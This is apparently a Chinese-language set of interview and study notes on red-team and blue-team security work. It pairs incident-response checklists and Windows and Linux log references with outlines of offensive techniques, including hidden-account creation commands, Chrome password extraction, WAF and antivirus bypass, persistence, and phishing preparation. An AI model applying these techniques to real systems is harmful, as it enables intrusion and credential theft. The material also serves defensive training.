+7.（事件分析）基于 流量态势感知ids/主机防御系统 hids（或是web日志，主机日志），找出红方攻击时间段，攻击ip，代理ip，影响范围，攻击流程，漏洞利用点，漏洞分析/钓鱼邮件分析/恶意程序，攻击点复现。
+7.（修复加固）出具修复/加固方案
+8.（输出报告）红方/攻击流程/利用阶段，蓝方应急响应/阻断情况/漏洞分析/修复加固/业务上线。
+9. 加分
+
+应急案例
+应急得分案例
+linux入侵排查流程
+检查账号安全
+检查账号中的危险信息
+检查用户执行过的命令
+检查异常端口
+检查进程的状况
+检查启动脚本
+检查计划任务
+检查开机自启服务
+查找可疑文件
+查看系统日志
+windows入侵排查流程
+账号安全
+启动项|策略组|计划|服务
+端口
+进程
+查看事件日志
+
+上面是主机排查
+个人应急流程/案例
+挖矿应急流程/案例
+蠕虫应急流程/案例
+勒索应急流程/案例
+
+Windows 事件日志
+1102	清理审计日志
+4624	登录成功
+4625	登录失败
+4648	使用显式凭据尝试登录
+4634	账号被注销
+4647	用户启动注销
+4672	使用超级用户（如管理员）进行登录
+4720	创建用户
+4726	删除用户
+4719        	系统审计策略修改
+
+linux系统日志
+日志默认存放位置	/var/log/
+查看日志配置情况	more /etc/rsyslog.conf
+/var/log/cron 	记录了系统定时任务相关的日志
+/var/log/cups 	记录打印信息的日志
+/var/log/dmesg 	记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息
+/var/log/mailog 	记录邮件信息
+/var/log/message 	记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件
+/var/log/btmp 	记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看
+/var/log/lastlog 	记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用
+lastlog	命令查看
+/var/log/wtmp 	永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看
+/var/log/utmp 	记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询
+/var/log/secure 	记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中源码包安装的服务
+
+webshell检测思路
+
+静态检测：匹配特征码，特征值，危险函数 
+动态检测：WAF、IDS等设备 
+日志检测：通过IP访问规律，页面访问规律筛选 文件完整性监控
+常用的Webshell检测工具有哪些？ 
+a. D盾 
+b. 河马WEBSHELL0
+c. 百度 WEBDIR+ 
+d. Web Shell Detector
+e. Sangfor WebShellKill [深信服] 
+f. PHP Malware Finder [支持Linux]
+
+Linux/windows分析日志工具有哪些？
+Linux/ Log Parser
+
+内存马原理
+
+我通过自身的理解，概述的说一下， 内存马的原理就是在web组件或者应用程序中，注册一层访问路由，访问者通过这层路由，来执行我们控制器中的代码
+
+内存马是无文件Webshell，什么是无文件webshell呢？简单来说，就是服务器上不会存在需要链接的webshell脚本文件。那有的同学可能会问了？这种方式为什么能链接呢？内存马的原理就像是MVC架构，即通过路由访问控制器
+内存马类型
+内存马如何查杀
+内存马查杀工具
+重启/关机 内存马就掉了
+
+任务管理器 查看内存的消耗
+java内存马排查
+如何判断有没有进行横向
+内网主机安全设备查看同网段主机是否被爆破、扫描、漏洞利用等
+判断横向（没有隧道/代理 工具，对内网扫码，存在隐患的主机 排查/梳理）
+
+如何证明恶意的宏被启用和点击了？
+
+HKEY_LOCAL_MACHINE\USERDAT\Software\Microsoft\Office\<VERS>\<PROGRAM>\Security\Trusted Documents\TrustRecords 
+
+只寻找最后四个字节是 "FF FF FF 7F "的值。
+
+
+这些文件已经启用了宏程序
+
+无文件落地shell
+通过在Powershell中嵌入PE文件加载的形式，达到执行“无文件”形式挖矿攻击。
+
+命令
+linux命令
+netstat 查看端口 
+ps 查看进程列表 
+grep 文件中搜索字符串 
+History 历史操作记录
+Ls -al 查看隐藏文件+权限
+Last 查看最近登录信息
+crontal 检查定时任务
+uname -a 查看版本当前操作系统内核信息，详细
+uname -srm 只看内核信息
+cat /proc/version  查看版本当前操作系统内核信息
+
+windows命令
+tasklist	该工具显示在本地或远程机器上当前运行的进程列表
+taskkill /F /PID  6400	根据PID结束进程
+taskkill /IM  javaw	根据进程名结束进程
+
+Wmic	查看指定进程信息
+
+quser	查看用户是否在线
+reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names	查看隐藏用户
+Net localgroup	显示当前系统里面所有的组
+net localgroup Administrators	查看当前组包含成员
+query user	当前登录账号
+net user	查看当前所有用户
+net user cc2	查看指定用户权限
+net user cc2 cc2 /add	添加用户
+net user cc2$ cc2 /add	添加隐藏用户
+net localgroup administrators cc2 /add	添加用户至 administrators管理组
+net localgroup administrators cc2 /del	从administrators管理组删除用户
+net user cc2 /del	删除用户
+net user cc2$ /del	删除隐藏用户
+
+linux管道符
+;	无视前面出错，前面语句执行完，再执行后面语句
+|	无视前面出错，前面语句执行完，再执行后面语句，显示后面语句执行结果
+||	如果前面出错，则执行后面语句
+&	无视前面出错，前面语句执行完，再执行后面语句
+&&	如果前面出错，则不执行后面语句
+
+windows管道符
+&	直接运行，不管成功/失败
+&&	前面运行成功才运行第二个命令
+|	前面运行成功才运行第二个命令，显示后面的结果
+||	运行不成功才运行第二个命令
+
+溯源
+针对攻击IP的溯源思路说一下
+1.	确定IP的一个归属，VPS？国内云服务器？运营商？企业IP？
+
+2.	钓鱼邮件
+3.	
+4.	对IP反渗透
+如何通过邮箱知道对方的IP
+
+溯源案例
+钓鱼邮件防沙箱手段
+丢沙箱获取的IP如果是CDN或CF怎么办
+溯源攻击画像
+补全攻击者信息
+Ip：
+邮箱：
+微信：
+QQ：
+身份证号：
+学校：
+ID：
+公司：
+通过ID有哪些思路
+百度->ID在哪发过文章，发表过评论->个人博客
+Goole->ID在哪发过文章，发表过评论->个人博客
+Csdn
+github
+各大安全社区
+微信
+qq
+
+钓鱼附近如何分析/处置
+1.伪造银行下方通知。
+
+沙箱/虚拟机/恶意行为/查找外网Ip
+
+查找钓鱼历史/微步查询/丢给二线处理
+
+1. 对于钓鱼邮件的分析，沙盒，微步查询，二线处理。
+2. 对于钓鱼邮件的分析，pdf文档内置shell脚本，从服务器请求shell脚本，pdf暴露恶意url，恶意Ip来自荷兰，反渗透失败
+
+3. 丢虚拟机
+4. 丢沙箱
+5. 丢微步
+7.
+钓鱼邮件里面包含了附近，有人点开了 内网闭环感染，
+
+对样本沙盒分析，外链地址，属于钓鱼地址，
+
+钓鱼样本分析，哈希值对比，找出目标团队
+
+蓝队常用反制手段有哪些？
+1. 蜜罐 
+2. 对攻击目标进行反渗透（IP定位、IP端口扫描、Web站点渗透） 
+3. 应用漏洞挖掘&利用（菜刀、Goby、Xray、蚁剑） 
+4. id -> 社交特征关联 
+5. 钓鱼网站 -> 后台扫描、XSS盲打 
+6. 木马文件 -> 同源样本关联 -> 敏感字符串特征检测
+7. APP蜜罐
+
+拿到肉鸡的权限，从哪些方面开展寻找攻击者痕迹
+
+你认为今年溯源从哪个方向，成功率会更高
+蜜罐
+针对红队有过什么反制手段
+简单说一下蜜罐的原理
+蜜罐就是利用 jsonp 跨域，类似csrf漏洞，如果攻击者在未开启无痕模式的状态下访问网站，且常用网站的cookie、身份验证未失效果的情况下，蜜罐网站代码中使用了jsonp进行跨域访问、读取某些api，获取个人信息、ID、手机号等
+（只要攻击者使用浏览器访问了，并且浏览器的缓存中有蜜罐配置的利用漏洞获取用户信息的网站COOKIE，那么蜜罐即可利用jsonp或者xss漏洞来获取攻击者的个人信息，有了姓名、ID、手机号等信息后，溯源红队也变的更加容易。）
+针对蜜罐的反制手段了解过吗
+HFish蜜罐就曾存在未授权读取信息漏洞以及存储XSS漏洞，默安科技幻阵蜜罐也曾存在未授权访问漏洞，利用蜜罐自身漏洞来反制蜜罐
+红队
+Web
+红队高频打点的漏洞有哪些
+1. Apache Shiro 相关漏洞 
+2. Fastjson 漏洞
+3. Log4j 
+4. 上传漏洞 
+5. 边界网络设备资产 + 弱口令
+
+spring，蓝凌oa，0day，常见cms，弱口令
+绕过cdn
+1.	多地/全球ping
+2.	DNS解析记录
+3.	域名历史解析记录
+4.	网络测绘引擎Fofa
+5.	子域c段
+6.	ico图标 md5值
+7.	Php 探针
+8.	邮箱邮件服务器 绑定的真实ip
+
+403/访问/目录/突破
+1.修改host
+2.扩展名绕过
+3.覆盖请求url
+4.Referer 标头
+5.fuzz下级目录
+
+站库分离怎么拿webshell
+域前置
+基于https，隐藏ip和域名
+腾讯云函数加密
+如何判断蜜罐
+蜜罐插件 百度api，常见api
+
+有没有绕过实战的WAF？
+文件上传 bypass
+Sql注入 bypass
+Sql注入
+1.fuzz 确认拦截了什么函数
+空白字符/内联注释/命令函数
+
+填充垃圾数据（waf存在长度要求）
+分块传输
+Xss bypass
+隐藏cs流量
+
+审计
+审计流程
+1.	环境搭建，
+2.	先进行黑盒/再进行审计，查看每个功能点存在的转义拦截，查看用户可控的入口点，危险函数
+
+1. 黑盒
+2. php框架cms海豚，尝试后台文件上传getshell，弱口令进入后台，尝试所有上传/更新功能，图片裁剪功能，上传一张照片，第一部上传存在问题 getshell。
+3. 黑白盒/刷卡系统
+4. Log泄露/用户名/pass
+5. 后台进去，管理菜单界面，
+
+
+待审一个cms的上传功能，你会关注哪些函数
+内网
+权限维持
+linux权限维持
+Linux
+公钥
+任务计划
+用户uid为0
+隐藏文件
+Rootkits
+后台进程
+
+Windows权限维持
+注册表
+启动项
+计划任务
+服务
+各类劫持
+命令执行绕过
+横向渗透时你会去攻击哪些东西，哪些是重点端口？
+Windows UAC原理是什么？
+Windows添加用户如何绕过火绒以及360？
+fastjson不出网利用
+是阿里巴巴的开源JSON解析库，是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON 字符串转换为 Java 对象
+
+1.写文件利用链，webshell
+2.去构造一个回显
+3.去构造一个时间盲注 报路径
+
+1.	其他链请求
+
+1定位目录写webshell
+
+1开启代理
+mimikatz的原理
+哪个补丁导致了mimikatz无法利用，如何绕过?
+cs上线时转到会话显示是ssh
+不用mimikatz怎么抓明文密码?
+导出
+Chrome dump密码的原理
+
+Chrome中保存的密码先被二次加密，而后被保存在SQLite数据库文件中
+
+%LocalAppData%\Google\Chrome\User Data\Default\Login Data
+
+先定位SQLite数据库文件
+
+读取数据库文件，获得二次加密的用户名/密码
+
+参考Chromium开源代码，找到Chrome作二次加密的方法
+
+找出对应函数加解密
+内网渗透降权的作用
+存在杀软，不允许exe落地，怎么办
+内网拿了web shell，发现不出网，怎么搞隧道
+DNS隧道和SMB隧道有没有了解过
+怎么搭建dns隧道，如何通过dns上线cs呢
+如何快速找到内网的主机以及如何避免内网WAF探测？
+
+白银/黄金 票据区别和利用
+白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票
+域委派
+域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。
+
+委派主要分为非约束委派和约束委派与基于资源的约束委派
+非可信域不出网流量
+域/组区别
+ 个人pc环境 / 域对整个域的管理
+
+查找域控
+域内信息收集
+说几个域控提权漏洞
+打域控（域控补丁打全）
+哈希传递
+域委派
+抓哈希，传递
+Ipv6
+
+免杀
+go语言免杀shellcode如何免杀？免杀原理是什么？
+windows defender防御机制原理，如何绕过？
+卡巴斯基进程保护如何绕过进行进程迁移？
+powershell免杀怎么制作？
+提取内存hash被查杀，如何绕过？
+shellcode免杀思路说一下？
+邮件钓鱼的准备工作有哪些？ 
+1. 确定邮件钓鱼的形式：链接、文件 
+2. 收集目标相关邮箱 
+3. 编写钓鱼邮件文案 （节日）
+4. 匿名邮箱 
+5. 木马免杀测试、钓鱼站点搭建 
+
+如何把shellcode嵌入到正常exe中？
+有没有写过绕安全狗的webshell
+
+钓鱼
+如何伪造钓鱼邮箱 会面临什么问题
+
+高级
+红蓝带队经验
+国家hw / 高级蓝队 /协调/任务调度/工作总结
+hw前期准备有哪些
+制度应急响应方案
+自身掌握技能
+了解甲方网络安全结构
+（网络架构，基线检查，排查资产，排除低级错误/自检，模拟红队攻击，生产/办公划分）
+
+应对0day为安全产品编写正则
+捕抓过哪些0day，不用讲具体payload细节
+sqlmap先在目标系统上写入一个拥有上传功能的木马，并对这个木马的内容进行16进制编码，这个木马名是由tmp加上五个随机字符组成的，然后再通过这个文件上传一个php木马文件，这个木马文件可以用来执行命令，并且可以将结果返回出来，在退出后会自动删除shell。
